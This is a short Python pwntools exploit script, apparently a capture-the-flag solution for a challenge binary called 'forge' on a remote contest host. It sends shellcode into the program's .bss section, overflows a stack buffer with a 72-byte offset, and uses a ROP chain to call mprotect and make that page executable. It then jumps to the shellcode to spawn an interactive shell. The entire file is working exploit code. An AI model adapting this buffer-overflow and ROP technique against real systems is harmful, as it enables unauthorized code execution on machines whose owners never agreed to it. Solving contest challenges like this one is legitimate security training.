#!/usr/bin/env python3
from pwn import *

# first, we need to send our shellcraft to the memory location of .bss, where the program expect us to send shellcode.
# then, first we need to override the buffer, in order to arrive at the rip address. then, we will call the mprotect functino,
# enabling code execution.
# once everything has been set up, we will jump to the shellcode, which will give us a shell.

context.binary = elf = ELF('./forge', checksec=False)
context.arch = 'amd64'

p = remote('offsec.m0lecon.it', 13559)

OFFSET_TO_RIP = 72  # TODO: find with cyclic

shellcode = asm(shellcraft.sh())
shellcode_addr = elf.sym.shellcode
page = shellcode_addr & ~0xfff

#p = process(elf.path)

# Stage 1: send shellcode into .bss
p.recvuntil(b'Send shellcode:')
p.send(shellcode.ljust(0x400, b'\x90'))


# Stage 2: ROP chain
payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(elf.sym.ret_gadget),
    p64(elf.sym.pop_rdi_ret), p64(page),       # TODO: mprotect arg 1
    p64(elf.sym.pop_rsi_ret), p64(0x1000),       # TODO: mprotect arg 2
    p64(elf.sym.pop_rdx_ret), p64(0x7),       # TODO: mprotect arg 3
    p64(elf.plt.mprotect),
    p64(shellcode_addr),                                  # TODO: where to jump after mprotect?
)

p.recvuntil(b'Input:')
p.send(payload)
p.interactive()
